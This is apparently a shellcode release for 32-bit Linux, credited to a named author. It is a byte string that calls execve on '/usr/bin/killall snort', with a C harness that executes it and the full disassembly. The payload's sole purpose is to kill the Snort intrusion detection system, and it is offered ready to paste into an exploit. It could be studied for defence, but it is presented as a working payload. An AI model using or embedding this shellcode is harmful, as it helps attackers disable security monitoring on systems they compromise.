Name = John Babio
Twitter = 3vi1john

/usr/bin/killall snort

const char sc[] = "\x31\xc0\x50\x6a\x74\x68\x73\x6e\x6f\x72\x89\xe6\x50\x68\x6c\x61\x6c\x6c\x68\x2f\x6b"
"\x69\x6c\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x50\x56\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";
main(){
      int (*shell)();
      shell=sc;
      shell();
    }

8048060 <_start>:
 8048060:       31 c0                   xor    %eax,%eax
 8048062:       50                      push   %eax
 8048063:       6a 74                   push   $0x74
 8048065:       68 73 6e 6f 72          push   $0x726f6e73
 804806a:       89 e6                   mov    %esp,%esi
 804806c:       50                      push   %eax
 804806d:       68 6c 61 6c 6c          push   $0x6c6c616c
 8048072:       68 2f 6b 69 6c          push   $0x6c696b2f
 8048077:       68 2f 62 69 6e          push   $0x6e69622f
 804807c:       68 2f 75 73 72          push   $0x7273752f
 8048081:       89 e3                   mov    %esp,%ebx
 8048083:       50                      push   %eax
 8048084:       56                      push   %esi
 8048085:       53                      push   %ebx
 8048086:       89 e1                   mov    %esp,%ecx
 8048088:       31 d2                   xor    %edx,%edx
 804808a:       b0 0b                   mov    $0xb,%al
 804808c:       cd 80                   int    $0x80